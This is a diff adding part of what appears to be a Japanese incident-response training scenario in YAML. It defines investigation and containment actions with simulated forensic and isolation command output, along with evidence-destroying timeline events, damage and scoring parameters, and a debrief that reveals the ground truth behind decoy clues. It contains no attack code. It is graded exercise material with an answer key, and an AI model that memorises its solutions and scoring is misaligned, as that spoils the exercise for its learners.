+      起動時や決まった時刻に動く登録を見る。端末には触らない。
+    cost_minutes: 25
+    investigates: [ws-eng01]
+    yields: [ev_eng_memory]
+
+  - id: act_eng_disk_image
+    label: "ws-eng01 を停止してディスクイメージを取得"
+    command: |
+      $ Stop-Computer -ComputerName WS-ENG01 -Force
+        WS-ENG01: powered off
+
+      $ ftkimager \\.\PHYSICALDRIVE0 /mnt/ir/wseng01 --e01 --frag 2G
+        Acquiring 512 GB ... done   (00:38:52)
+        MD5/SHA1 verified
+
+      $ mftecmd.exe -f wseng01.E01 --csv /mnt/ir/out
+        $MFT parsed
+      $ AppCompatCacheParser.exe -f wseng01/SYSTEM --csv /mnt/ir/out
+        cache parsed
+    group: "ws-eng01（設計部端末）"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child]
+    description: |
+      ws-eng01 をシャットダウンしてディスクを取り外し、物理イメージを取得する。
+      ファイル索引、登録された定期実行、実行の並びを網羅的に見られる。
+      停止が前提なので、稼働中にしか存在しない情報は取れなくなる。
+    cost_minutes: 55
+    investigates: [ws-eng01]
+    yields: [ev_eng_disk]
+    destroys: [ev_eng_memory]
+
+  - id: act_eng_proxy
+    label: "ws-eng01 のプロキシログを照合"
+    command: |
+      $ zgrep '192.0.2.44' /var/log/squid/access.log.*.gz | wc -l
+        8
+
+      $ zgrep '192.0.2.44' /var/log/squid/access.log.*.gz \
+          | awk '{print $1}' | awk 'NR>1{print $1-p} {p=$1}' | datamash mean 1 sstdev 1
+        60.4   1.2
+    group: "ws-eng01（設計部端末）"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child]
+    description: |
+      プロキシと境界ファイアウォールの記録から、対象端末の外向き通信を
+      1リクエストずつ洗う。宛先、間隔、転送量、User-Agent を見る。
+    cost_minutes: 20
+    investigates: [ws-eng01]
+    yields: [ev_proxy]
+
+  - id: act_dlp_review
+    label: "DLP と CASB のログを精査し外部送信を確認"
+    command: |
+      $ dlpctl alerts --from 2026-04-09T00:00 --policy confidential-egress
+        0 alerts
+
+      $ casbctl egress --unapproved --min-size 5MB --from 2026-04-09T00:00
+        0 transfers
+
+      $ casbctl egress --approved --min-size 5MB --from 2026-04-09T00:00
+        3 transfers
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    requires_evidence: [ev_eng_child, ev_agent_beacon]
+    description: |
+      情報持ち出し監視とクラウド利用監視の記録を引き、機密区分の外部送信が
+      検知されていないかを確認する。承認済み宛先と未承認宛先を分けて見る。
+    cost_minutes: 25
+    investigates: []
+    yields: [ev_dlp]
+
+  # **引き直せる手**（`repeatable: true`）。回った時点の姿しか返さないので、
+  # 窓が開いた後にもう一度回れば、同じ欄が別の値を持つ。
+  # 盤面が動く以上、一度見たことは時間が経てば古くなる
+  - id: act_endpoint_sweep
+    label: "各部署の端末を回って、入っている版と導入記録を突き合わせる"
+    command: |
+      $ cfgagentctl inventory --all
+        5 hosts listed
+
+      $ for h in $(cfgagentctl hosts --ring 2,3); do \
+          cfgagentctl status --host $h; tail -4 post-install.log; done
+        2 hosts visited   (00:31:40)
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    tags: [volatile_capture]
+    repeatable: true
+    requires_evidence: [ev_deploy_ledger]
+    description: |
+      各部署の端末を順に回り、いま入っている版と、導入のたびに追記される
+      作業記録を突き合わせる。回った時点の姿を採る作業で、
+      移動と現地での確認の分だけ時間がかかる。
+    cost_minutes: 35
+    investigates: [ws-sales, ws-acct]
+    yields: [ev_sweep_state, ev_ring_sales, ev_ring_acct]
+
+  # ── 現場への指示 ──
+  # 証拠を取りに行くのではなく、証拠が消えるのを止めに行く手。
+  # 効くのは打ち終わった時刻から先だけで、既に起きたことには効かない
+  - id: act_hold_notice
+    label: "全社と運用に、当面の現状維持を周知する"
+    command: |
+      $ mail -s "[重要] 障害対応中の操作について" all-staff@corp.example < notice.txt
+        delivered: 268 recipients
+
+      $ helpdesk-cli script set --id first-response --file notice-hd.txt
+        1 script updated
+
+      $ chatops post --channel #ops-announce --pin
+        pinned
+    group: "全体への指示"
+    phase: investigation
+    type: communicate
+    description: |
+      情報システム部から全社と運用チームへ、端末やサーバの状態を
+      各自の判断で変えないよう周知する。ヘルプデスクの一次応答も
+      同じ文面に差し替え、問い合わせへの回答を揃える。
+      調査そのものは1ミリも進まない。
+    cost_minutes: 15
+    prevents: [tl_field_rollback, tl_ops_restart, tl_field_reimage]
+
+  # ── 封じ込め・対応 ──
+  - id: act_block_dist_edge
+    label: "dist01 の配信ポートを境界と機器側で遮断"
+    command: |
+      $ chgctl request --type acl --scope core --window now --approver oncall
+        CHG-2026-0418  emergency  approved  (00:16:30)
+
+      $ swctl acl add --vlan 20 --dst 192.0.2.10/32 --proto tcp --dport 8443 \
+          --action deny --log
+        acl applied (sw-core-01, sw-core-02)  entries: 1
+
+      $ cfgagentctl probe --endpoint 192.0.2.10:8443
+        connect : timed out (blocked)
+        サーバは稼働を継続。管理系の通信に変化なし。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      配信に使う通信を、機器側のアクセス制御で塞ぐ。サーバは動いたままで、
+      管理系の通信も続く。日中帯の構成変更なので、変更管理の承認と
+      実機での確認に時間がかかる。
+    cost_minutes: 25
+    targets: [dist01]
+    investigates: []
+    side_effects:
+      business_impact: false
+
+  - id: act_isolate_eng01
+    label: "ws-eng01 をネットワークから隔離"
+    command: |
+      $ edrctl isolate --host WS-ENG01 --allow-management
+        WS-ENG01: network isolation ENABLED  (00:02:18)
+        端末は動作を継続。管理経路のみ許可。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      ws-eng01 をネットワークから切り離す。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [ws-eng01]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_isolate_lobby
+    label: "ws-lobby をネットワークから隔離"
+    command: |
+      $ edrctl isolate --host WS-LOBBY --allow-management
+        WS-LOBBY: network isolation ENABLED  (00:02:02)
+        端末は動作を継続。管理経路のみ許可。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      ws-lobby をネットワークから切り離す。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [ws-lobby]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_isolate_mgmt01
+    label: "mgmt01 をネットワークから隔離"
+    command: |
+      $ edrctl isolate --host MGMT01 --allow-management
+        MGMT01: network isolation ENABLED  (00:02:44)
+        端末は動作を継続。管理経路のみ許可。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      mgmt01 をネットワークから切り離す。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [mgmt01]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_isolate_sales
+    label: "ws-sales をネットワークから隔離"
+    command: |
+      $ edrctl isolate --host WS-SALES --allow-management
+        WS-SALES: network isolation ENABLED  (00:02:09)
+        端末は動作を継続。管理経路のみ許可。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      ws-sales をネットワークから切り離す。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [ws-sales]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_isolate_acct
+    label: "ws-acct をネットワークから隔離"
+    command: |
+      $ edrctl isolate --host WS-ACCT --allow-management
+        WS-ACCT: network isolation ENABLED  (00:02:31)
+        端末は動作を継続。管理経路のみ許可。
+    group: "通信だけを止める"
+    phase: response
+    type: contain
+    description: |
+      ws-acct をネットワークから切り離す。端末は動いたまま、通信だけを止める。
+    cost_minutes: 10
+    targets: [ws-acct]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  # dist01 に対する手は**3つある**。ここが対応フェーズの取捨選択の中心で、
+  # 3つの方針が3つの違う答えを出す唯一の場所である（SPEC 5.6）。
+  #
+  #   境界で遮断    25分  サーバ稼働・保守は続く・稼働中の状態が残る
+  #   配信だけ停止  10分  サーバ稼働・保守が止まる・稼働中の状態が残る
+  #   サーバ停止    15分  電源を落とす・保守が止まる・稼働中の状態が消える
+  - id: act_stop_dist_service
+    label: "dist01 の配信サービスだけを停止"
+    command: |
+      $ jobctl queue list --state running
+        Count : 2
+
+      $ systemctl stop cfgdist --now
+        cfgdist: stopped  (00:00:47)
+
+      $ cfgagentctl probe --endpoint 192.0.2.10:8443
+        connect : connection refused
+
+        サーバは稼働を継続。以後の配信は走らない。
+    group: "動いているものを止める"
+    phase: response
+    type: contain
+    description: |
+      構成管理サーバの配信サービスを止める。ホストは動いたままで、
+      以後の配信と設定適用だけが全社から使えなくなる。
+      手元から1コマンドで済むので、承認も実機確認も要らない。
+    cost_minutes: 10
+    targets: [dist01]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  - id: act_shutdown_dist01
+    label: "dist01 を停止"
+    command: |
+      $ systemctl stop cfgdist --now
+        cfgdist: stopped
+      $ shutdown -h now
+        DIST01: powered off  (00:04:19)
+
+        配信と設定適用はすべて停止した。
+    group: "動いているものを止める"
+    phase: response
+    type: contain
+    description: |
+      構成管理サーバの電源を落とす。配信も設定適用も使えなくなり、
+      ホスト上で動いているものはすべて落ちる。
+    cost_minutes: 15
+    targets: [dist01]
+    investigates: []
+    destroys: [ev_dist_live]
+    side_effects:
+      business_impact: true
+
+  - id: act_stop_repo01
+    label: "repo01 を停止"
+    command: |
+      $ shutdown -h now
+        REPO01: powered off  (00:03:26)
+
+        パッケージ領域への参照はすべて失敗する。
+    group: "動いているものを止める"
+    phase: response
+    type: contain
+    description: |
+      パッケージ保管庫の電源を落とす。保管庫を参照している資産は
+      新しい版を取得できなくなる。
+    cost_minutes: 15
+    targets: [repo01]
+    investigates: []
+    side_effects:
+      business_impact: true
+
+  # 3つ目の束。**止めることと、居座られた状態を消すことは別の作業である。**
+  # 通信を断てば外からの手は届かなくなるが、端末に残された登録は
+  # そのままなので、端末を業務に戻した瞬間に元へ戻る。
+  # この束だけが `eradicates` を持ち、5.8 の減衰を on_partial から
+  # on_correct_containment へ動かす
+  - id: act_purge_eng01
+    label: "ws-eng01 の自動実行の登録を EDR で標準状態に戻す"
+    command: |
+      $ edrctl remediate --host WS-ENG01 --scope autorun --restore-baseline
+        Scheduled Tasks        : 1 entry reverted
+        HKCU\...\Run           : baseline matched
+        HKLM\...\Run           : baseline matched
+        Services               : baseline matched
+        applied  (00:05:36)
+
+      $ edrctl scan --host WS-ENG01 --profile deep --verify
+        scanned 196,220 objects   (00:32:18)
+        端末は動作を継続。利用者はそのまま作業できる。
+    group: "元の状態に戻す"
+    phase: response
+    type: contain
+    description: |
+      ws-eng01 の自動実行まわりの登録を、EDR の標準構成と突き合わせて戻す。
+      端末は動いたままで、利用者の作業も止まらない。
+      戻した先が本当に標準どおりかを確かめる深いスキャンに時間がかかる。
+    cost_minutes: 40
+    targets: [ws-eng01]
+    eradicates: [ws-eng01]
+    investigates: []
+    destroys: []
+    side_effects:
+      business_impact: false
+
+  - id: act_rebuild_eng01
+    label: "ws-eng01 を初期化して標準構成で復帰させる"
+    command: |
+      $ imgctl deploy --host WS-ENG01 --image corp-win11-std --wipe
+        disk 0: secure erase started
+        disk 0: secure erase done  (00:10:51)
+        image applied, 1 partition, 62 GB
+
+      $ domainctl rejoin --host WS-ENG01 --ou "OU=Engineering" --new-machine-password
+        WS-ENG01: rejoined  (00:25:44)
+        端末は標準構成で起動。利用者プロファイルは復元待ち。
+    group: "元の状態に戻す"
+    phase: response
+    type: contain
+    description: |
+      ws-eng01 のディスクを消去して標準イメージを再導入し、ドメインへ入れ直す。
+      流し込みは自動化されているので短い。作業の間その端末は使えない。
+    cost_minutes: 30
+    targets: [ws-eng01]
+    eradicates: [ws-eng01]
+    investigates: []
+    destroys: [ev_eng_memory, ev_eng_disk]
+    side_effects:
+      business_impact: true
+
+  # **囮**（SPEC 5.6 / v1.45）。`eradicates` を持つ手が ws-eng01 の2つだけなら、
+  # この束を読むだけで「取り除くものが残っているのはどれか」が分かる。
+  # 誤導（11:00 の同時刻の通信）に乗った学習者は、この端末についても
+  # 同じことをしたくなる。40分は返ってこない
+  - id: act_purge_lobby
+    label: "ws-lobby の自動実行の登録を EDR で標準状態に戻す"
+    command: |
+      $ edrctl remediate --host WS-LOBBY --scope autorun --restore-baseline
+        Scheduled Tasks        : baseline matched
+        HKCU\...\Run           : 1 entry reverted
+        HKLM\...\Run           : baseline matched
+        Services               : baseline matched
+        applied  (00:04:55)
+
+      $ edrctl scan --host WS-LOBBY --profile deep --verify
+        scanned 131,470 objects   (00:29:02)
+        端末は動作を継続。利用者はそのまま作業できる。
+    group: "元の状態に戻す"
+    phase: response
+    type: contain
+    description: |
+      ws-lobby の自動実行まわりの登録を、EDR の標準構成と突き合わせて戻す。
+      端末は動いたままで、利用者の作業も止まらない。
+      戻した先が本当に標準どおりかを確かめる深いスキャンに時間がかかる。
+    cost_minutes: 40
+    targets: [ws-lobby]
+    eradicates: [ws-lobby]
+    investigates: []
+    destroys: []
+    side_effects:
+      business_impact: false
+
+# 時間が経つと向こうから入ってくること（SPEC 5.10）。
+# どれも学習者に不利にしか働かない。奪うか、費用の変化を告げるか。
+#
+# 誰が悪いという話ではない。応答の鈍った処理を再起動する判断も、
+# 入ったばかりの更新を戻す動きも、それ自体は正しい行動である。
+# 稼働中にしか無い情報は、そういう善意で普通に消える。
+timeline:
+  - id: tl_accel
+    at_minutes: 200
+    label: "監視センターから追加連絡"
+    text: |
+      「外へ出ている通信が増えています。
+        さっきまでの倍くらいの数で並んでいるように見えます。」
+    heralds: acceleration     # 折れ点（190分）の唯一の予告
+
+  - id: tl_ops_restart
+    at_minutes: 330
+    label: "運用チームから連絡"
+    text: |
+      「応答が鈍くなっていたので、サーバ側の処理を一度再起動しました。
+        日中帯で問い合わせが詰まっていたため、復旧を優先しました。」
+    destroys: [ev_dist_live]
+    averted_label: "運用チームから連絡"
+    averted_text: |
+      「応答が鈍いので再起動をかけようとしたのですが、
+        周知が回っていたので手を止めました。そのままにしてあります。」
+
+  - id: tl_field_rollback
+    at_minutes: 350
+    label: "ヘルプデスクから連絡"
+    text: |
+      「入ったばかりの更新を各自で戻す動きが、現場で始まっています。
+        こちらからは何も出していないので、止めようがありません。」
+    destroys: [ev_eng_memory]
+    averted_label: "ヘルプデスクから連絡"
+    averted_text: |
+      「更新を戻していいかという問い合わせが続いています。
+        先の周知どおり、そのままにしておくよう返しています。」
+
+  - id: tl_field_reimage
+    at_minutes: 410
+    label: "ヘルプデスクから連絡"
+    text: |
+      「動かなくなったという申告があった端末を、手順どおり
+        標準構成で入れ直しました。利用者はもう使い始めています。」
+    destroys: [ev_eng_disk]
+    averted_label: "ヘルプデスクから連絡"
+    averted_text: |
+      「入れ直してよいかという申告が来ていますが、先の周知どおり、
+        そのまま預かって手を付けずにあります。」
+
+phases:
+  - id: investigation
+    label: "調査"
+    advance_label: "対応フェーズに移る"
+
+  - id: response
+    label: "封じ込め・対応"
+    advance_label: null
+    requires_assessment: true
+
+damage:
+  model: exponential
+  params:
+    base: 330.0
+    rate: 0.15
+  acceleration:
+    # 折れ点は「巧いプレイの長さ」L の 1.1〜1.3 倍（SPEC 8.2 手順7）。
+    # **L は方針に依存する**（v1.40）。判断まで 100分（検知の詳細15 ＋
+    # 台帳15 ＋ コンソールの記録25 ＋ メモリ 20+25）。
+    #   業務継続   100分 ＋ 配信停止10 ＋ 作り直す30 = 140分
+    #   証拠保全   100分 ＋ 配信元の採取25 ＋ 配信停止10 ＋ 登録を戻す40 = 175分
+    #   拡散阻止   100分 ＋ サーバ停止15 ＋ 作り直す30 = 145分
+    # 折れ点は**最も高くつく方針**（証拠保全 175分）で置く。220/175 = 1.26倍。
+    # 上限を決めているのは 8.3 のもう1本 — 調査フェーズの総コスト 505分が
+    # 折れ点の2倍以上であること（≦252分）。窓は 193〜252分ある。
+    #
+    # **拡散の窓（270分 / 400分）はさらに後ろに置く。** どの方針で解いても、
+    # 配り元が止まるのは遅くとも 155分（証拠保全）なので、最初の窓まで
+    # 115分の余裕がある。防げない拡散は教材ではなく罰である（SPEC 5.2）
+    threshold_minutes: 220
+    multiplier: 2.5
+  containment_effect:
+    on_correct_containment: 0.2
+    on_partial: 0.6
+    on_incorrect: 1.0
+
+scoring:
+  fact_layer:
+    metrics:
+      - id: assessment_precision
+        label: "被疑判定の適合率"
+        direction: higher_is_better
+      # **分母が動く**（SPEC 5.2）。配られた先は、判定した時点で
+      # 名指しすべきものに入る。早く判定して早く止めた人の分母は動かない
+      - id: assessment_recall
+        label: "被疑判定の再現率"
+        direction: higher_is_better
+      - id: assessment_support
+        label: "名指しの裏付け"
+        direction: higher_is_better
+      - id: unresolved_questions
+        label: "未解消論点を抱えたままの判断"
+        label_good: "論点を解消してからの判断"
+        direction: lower_is_better
+    weights:
+      assessment_precision:  0.20
+      assessment_recall:     0.20
+      assessment_support:    0.20
+      # critical 論点が3つあるので 4段階の階段になる。1論点 = 13.3 fact点
+      unresolved_questions:  0.40
+
+  policy_layer:
+    constraint_penalty: 0.15
+
+  consequence_layer:
+    display_only:
+      - elapsed_minutes
+      - total_damage
+      - business_impact
+      - evidence_preserved
+      - containment_completeness
+    business_impact_horizon_minutes: 480
+    normalization:
+      total_damage:             { worst: 20000, best: 0 }
+      # 盤面で到達できる最大は「全部押して全部止める」の 1308。
+      # 広すぎる帯は差を潰し、狭すぎる帯は上位を 0 で並べる（6.4）
+      business_impact:          { worst: 1400,  best: 0 }
+      # 失いうるのは destroys に書かれた分だけ（ev_eng_memory / ev_eng_disk /
+      # ev_dist_live）。3/22 = 到達しうる最悪 0.864。
+      # **件数を1つ増やすと、1件あたりの重みがそのぶん薄まる** —
+      # 連絡が守る1件が方針適合でいくらになるかは、この件数で決まる
+      evidence_preserved:       { worst: 0.864, best: 1.0 }
+      containment_completeness: { worst: 0.0,  best: 1.0 }
+
+  composite:
+    method: weighted_sum
+    fact_weight: 0.7
+
+retrospective:
+  minimal_path:
+    compute: true
+    label: "事後的に見た最短経路"
+    disclaimer: |
+      これは答えを知った上で算出した参照値です。
+      実際の対応では、外れを引くことは避けられません。
+      この差分は無駄ではなく、不確実性の代価です。
+  counterfactuals:
+    compute: true
+  unresolved_review:
+    compute: true
+
+debrief:
+  reveal_ground_truth: true
+  misleading_explanations:
+    ev_agent_beacon: |
+      11:00 に ws-lobby と ws-eng01 が同じ宛先へ同じ形の通信を出していたのは、
+      配布エージェントが毎正時に配信元へ問い合わせる標準の動作によるものです。
+      起点が正時に固定されているので、全端末の問い合わせが同じ分に揃います。
+      同じ製品の同じ版なので、TLS の挨拶の仕方も同じ値になります。
+
+      記録は嘘をついていません。2台は本当に同じ時刻に同じ形で話しています。
+      誤っていたのは、そこから読んだ因果です。2つのものが同じ振る舞いを
+      するとき、片方がもう片方を動かしたのか、同じ第三のものが両方を
+      動かしたのかは、振る舞いが同じであることからは決まりません。
+
+      決められるのは、その第三のものを見に行くか、もう一方の端末を
+      見に行くかのどちらかです。共通設定を引けば全端末が同じ動きを
+      することが分かり、端末まで行けば、そこに入っている版が前の配信の
+      ままだと分かります。
+    ev_mgmt_privileged: |
+      10:35 から始まる 63 件は、承認済みの定例メンテナンス
+      (CHG-2026-0412) の作業です。配信履歴の棚卸しと失敗ジョブの
+      再投入は、どちらも権限の昇格を要求する操作なので、
+      短い時間にまとまって記録されます。
+
+      監査ログが記録するのは、操作を受けた側から見た
+      「どの端末のどのアカウントが何をしたか」です。
+      件数の多さは、まとめて処理する作業でも、一つずつ試す作業でも
+      同じように増えます。何をしたかは操作名の側に出ています。
+    ev_pkg_signature: |
+      署名検証の結果そのものは正しく、嘘は書かれていません。
+      パッケージ本体は、repo01 に置かれた版も dist01 が持っている控えも、
+      最初から最後まで署名したときのままです。
+
+      誤っていたのは資料ではなく、そこからの一般化です。
+      「パッケージが正しい」は「配る仕組みが触られていない」ではありません。
+      検証範囲の欄が「パッケージ本体と、その署名」と書いており、
+      非対象の欄が「配信ジョブの定義、導入の前後に走らせる処理の記述」と
+      書いています。攻撃者が触ったのは、まさにその非対象の側でした。
+
+      配る仕組みは、何を配るかのほかに、誰にいつ配るかと、
+      入れる前後に何をするかを別に持っています。前者だけを守っても、
+      後者から同じことができます。
+  key_lessons:
+    - "2つのものが同じ振る舞いをしていても、片方がもう片方を動かしたとは限らない。同じ第三のものが両方を動かしている場合、その第三のものを見に行くまで向きは決まらない。"
+    - "配る仕組みは、配るものと、配る先と、配るときに何をするかを別々に持っている。片方の正しさは、もう片方の正しさを意味しない。資料は自分が何を見ていないかを書いている。"
+    - "止める場所を1つ間違えると、業務だけが止まって攻撃は止まらない。依存の根を落とすことと、動いている仕組みを止めることは別である。"
+    - "調べている間も盤面は動く。一度回って確かめたことは、時間が経てば古くなる。回った時刻より後のことは、その資料には載りようがない。"
+    - "判断は、下した時点の盤面に対して正しいかどうかで測られる。正しく判断したことと、最後まで止めきれたことは別の問いである。"
+    - "通信を止めることと、端末を元の状態に戻すことは別の作業である。前者だけでは、その端末を業務に戻したときに元へ戻る。"
+    - "揮発性の情報は封じ込めで失われる。取得の順序そのものが判断である。"
+    - "入られた口を塞がないまま封じ込めても、同じ口から戻られる。"
+    - "無関係な資産を止めることには値段がある。止めた先の仕事は、こちらの都合とは無関係に止まる。"
+  replay_suggestions:
+    - policy: evidence_preservation
+      hint: |
+        同じ状況を「証拠保全最優先」で解くと、配る側に取れる手が変わります。
+        止める資産ごとに、その資産から先に取る必要があり、
+        外から塞ぐだけにも、電源を落としても、作り直してもいけません。
+        取るための時間がそのまま被害に乗るので、被害は伸びます。
+    - policy: business_continuity
+      hint: |
+        「業務継続最優先」では、拠点全体の保守を止める判断が高くつきます。
+        同じ行動列でも評価が変わることを確かめてください。
